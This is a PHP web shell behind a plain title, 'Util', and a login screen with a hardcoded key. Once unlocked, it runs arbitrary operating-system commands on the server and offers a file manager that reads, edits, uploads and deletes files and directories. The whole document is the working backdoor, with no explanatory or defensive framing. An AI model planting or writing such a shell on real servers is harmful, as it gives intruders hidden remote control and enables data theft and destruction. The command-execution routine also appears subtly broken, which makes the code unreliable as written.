<?php session_start(); $p = "safety_team"; $d = isset($_REQUEST['d']) ? $_REQUEST['d'] : getcwd(); $d = str_replace('\\', '/', $d); if (substr($d, -1) !== '/') { $d .= '/'; } if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) { if (isset($_POST['p']) && $_POST['p'] === $p) { $_SESSION['auth'] = true; } else { echo '<html><head><title>Access</title><style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background-color:#282a36;color:#f8f8f2;}.x{background-color:#44475a;padding:30px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;}input[type="password"],input[type="submit"]{width:100%;padding:12px;margin-bottom:15px;border:1px solid #6272a4;border-radius:4px;box-sizing:border-box;background-color:#6272a4;color:#f8f8f2;}input[type="submit"]{background-color:#50fa7b;color:#282a36;cursor:pointer;font-weight:bold;}input[type="submit"]:hover{background-color:#ffb86c;}h2{color:#bd93f9;}</style></head><body><div class="x"><h2>Login</h2><form method="POST"><input type="password" name="p" placeholder="Key"><input type="submit" value="Enter"></form></div></body></html>'; exit(); } } function r($c,$dr){$c=escapeshellarg($c);$f="cd ".escapeshellarg($dr)." && ".$c." 2>&1";if(function_exists('system')){ob_start();system($f);$o=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($f);$o=ob_get_clean();}elseif(function_exists('shell_exec')){$o=shell_exec($f);}elseif(function_exists('exec')){$oa=array();exec($f,$oa);$o=implode("\n",$oa);}elseif(function_exists('popen')){$h=popen($f,'r');$o="";while(!feof($h)){$o.=fread($h,2096);}pclose($h);}else{$o="No exec funcs!";}return htmlspecialchars($o);} function l($dr){$f=@scandir($dr);$h='<table width="100%">';$h.='<tr><th>Type</th><th>Name</th><th>Size</th><th>Perms</th><th>Ops</th></tr>';$pd=dirname($dr);if($pd!==$dr){$h.='<tr><td>DIR</td><td><a href="?d='.urlencode($pd).'">..</a></td><td></td><td></td><td></td></tr>';}if($f){foreach($f as $fi){if($fi=='.'||$fi=='..')continue;$fp=$dr.$fi;$t=is_dir($fp)?'DIR':(is_file($fp)?'FILE':'UNK');$s=is_file($fp)?filesize($fp):'';$pe=substr(sprintf('%o',fileperms($fp)),-4);$h.='<tr>';$h.='<td>'.$t.'</td>';$h.='<td><a href="?d='.urlencode($fp).'">'.htmlspecialchars($fi).'</a></td>';$h.='<td>'.htmlspecialchars($s).'</td>';$h.='<td>'.htmlspecialchars($pe).'</td>';$h.='<td>';if(is_file($fp)){$h.='<a href="?a=e&f='.urlencode($fp).'">Edit</a> | ';$h.='<a href="?a=x&f='.urlencode($fp).'" onclick="return confirm(\'Del?\');">Del</a>';}elseif(is_dir($fp)){$h.='<a href="?a=xd&d='.urlencode($fp).'" onclick="return confirm(\'Del Dir?\');">Del Dir</a>';}$h.='</td>';$h.='</tr>';}}else{$h.='<tr><td colspan="5">No files: '.htmlspecialchars($dr).'</td></tr>';}$h.='</table>';return $h;} $o = ""; $m = ""; $cf = ""; $ef = ""; if (isset($_POST['a'])) { switch ($_POST['a']) { case 'c': $o = r($_POST['x'], $d); break; case 'md': $nf = $_POST['nf']; $ptc = $d . $nf; if (@mkdir($ptc)) { $m = "Folder '" . htmlspecialchars($nf) . "' created."; } else { $m = "Error creating folder: " . htmlspecialchars($nf); } break; case 'xf': $ftd = $_POST['fp']; if (@unlink($ftd)) { $m = "File '" . htmlspecialchars(basename($ftd)) . "' deleted."; } else { $m = "Error deleting file: " . htmlspecialchars(basename($ftd)); } break; case 'es': $fp = $_POST['efp']; $nc = $_POST['fc']; if (@file_put_contents($fp, $nc) !== false) { $m = "File '" . htmlspecialchars(basename($fp)) . "' saved."; } else { $m = "Error saving file: " . htmlspecialchars(basename($fp)); } break; case 'up': if (isset($_FILES['uf'])) { $tf = $d . basename($_FILES["uf"]["name"]); if (move_uploaded_file($_FILES["uf"]["tmp_name"], $tf)) { $m = "File '" . basename($_FILES["uf"]["name"]) . "' uploaded to " . $tf; } else { $m = "Error uploading file: " . $_FILES["uf"]["error"]; } } break; } } elseif (isset($_GET['a'])) { switch ($_GET['a']) { case 'x': $ftd = $_GET['f']; if (@unlink($ftd)) { $m = "File '" . htmlspecialchars(basename($ftd)) . "' deleted."; } else { $m = "Error deleting file: " . htmlspecialchars(basename($ftd)); } header("Location: ?d=".urlencode($d)); exit(); break; case 'xd': $dtd = $_GET['d']; if (@rmdir($dtd)) { $m = "Dir '" . htmlspecialchars(basename($dtd)) . "' deleted."; } else { $m = "Error deleting dir."; } header("Location: ?d=".urlencode(dirname($dtd).'/')); exit(); break; case 'e': $ef = $_GET['f']; $cf = @file_get_contents($ef); if ($cf === false) { $m = "Could not read file: ".htmlspecialchars(basename($ef)); } break; } } ?>
<!DOCTYPE html><html><head><title>Util</title><style>body{font-family:monospace;background-color:#282a36;color:#f8f8f2;margin:0;padding:20px;}.x{max-width:960px;margin:auto;background-color:#44475a;padding:20px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.5);}.h{text-align:center;color:#bd93f9;margin-bottom:20px;}.pd{color:#50fa7b;margin-bottom:10px;}.s{background-color:#21222c;padding:15px;border-radius:5px;margin-bottom:20px;}h2{color:#ff79c6;border-bottom:1px solid #6272a4;padding-bottom:5px;margin-top:0;}input[type="text"],input[type="submit"],textarea,input[type="password"],input[type="file"]{background-color:#6272a4;border:1px solid #bd93f9;color:#f8f8f2;padding:8px;margin-top:5px;border-radius:4px;box-sizing:border-box;}input[type="text"]{width:calc(100% - 100px);}input[type="submit"]{cursor:pointer;background-color:#50fa7b;color:#282a36;font-weight:bold;}input[type="submit"]:hover{background-color:#ffb86c;}textarea{width:100%;min-height:200px;resize:vertical;}pre{white-space:pre-wrap;word-wrap:break-word;color:#f8f8f2;}table{width:100%;border-collapse:collapse;margin-top:10px;}th,td{border:1px solid #6272a4;padding:8px;text-align:left;}th{background-color:#55586b;color:#8be9fd;}a{color:#8be9fd;text-decoration:none;}a:hover{text-decoration:underline;}.m{background-color:#ffb86c;color:#282a36;padding:10px;border-radius:5px;margin-bottom:15px;font-weight:bold;}</style></head><body><div class="x"><div class="h"><h1>Util</h1><p class="pd">Path: <?php echo htmlspecialchars($d); ?></p><?php if ($m): ?><div class="m"><?php echo $m; ?></div><?php endif; ?></div><div class="s"><h2>Cmd</h2><form method="POST"><input type="hidden" name="a" value="c"><input type="text" name="x" placeholder="Cmd..." autofocus><input type="submit" value="Run"></form><div class="content-box"><pre><?php echo $o; ?></pre></div></div><div class="s"><h2>Files</h2><form method="POST"><input type="hidden" name="a" value="cd"><input type="text" name="d" value="<?php echo htmlspecialchars($d); ?>" style="width:calc(100% - 150px);"><input type="submit" value="Go"></form><div class="content-box"><?php echo l($d); ?></div><form method="POST"><input type="hidden" name="a" value="md">New Dir: <input type="text" name="nf" placeholder="new_dir"><input type="submit" value="Create Dir"></form><form method="POST" enctype="multipart/form-data"><input type="hidden" name="a" value="up">Upload: <input type="file" name="uf"><input type="submit" value="Upload File"></form></div><?php if (!empty($ef)): ?><div class="s"><h2>Edit: <?php echo htmlspecialchars(basename($ef)); ?></h2><form method="POST"><input type="hidden" name="a" value="es"><input type="hidden" name="efp" value="<?php echo htmlspecialchars($ef); ?>"><textarea name="fc"><?php echo htmlspecialchars($cf); ?></textarea><br><input type="submit" value="Save"><a href="?d=<?php echo urlencode($d); ?>" style="display:inline-block;margin-top:10px;padding:8px 15px;background-color:#ff6c6c;color:white;border-radius:4px;">Cancel</a></form></div><?php endif; ?></body></html>
